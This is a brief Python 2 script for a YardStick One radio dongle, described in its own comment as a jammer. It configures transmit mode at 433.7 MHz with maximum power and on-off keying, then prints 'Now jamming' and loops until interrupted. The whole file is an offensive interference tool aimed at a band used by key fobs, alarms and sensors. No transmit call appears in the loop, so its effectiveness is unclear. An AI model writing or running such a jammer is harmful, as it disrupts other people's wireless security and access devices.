#!/usr/bin/env python2
#
# Sends a jamming signal (just a stream of ones) using a yardstick one.

import time
from rflib import *

yardstick = RfCat(idx=0)
yardstick.setModeTX()
yardstick.setFreq(433700000)
yardstick.setMaxPower()
yardstick.setMdmChanSpc(24000)
yardstick.setMdmModulation(MOD_ASK_OOK)
yardstick.setMdmDRate(int(1.0/0.0006))
yardstick.setRFRegister(PA_TABLE0,0xFF)
yardstick.setRFRegister(PA_TABLE1,0xFF)
yardstick.makePktFLEN(255)

try:
    print("Now jamming, press ctrl-c to stop")
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("Bye")
    yardstick.setModeIDLE()
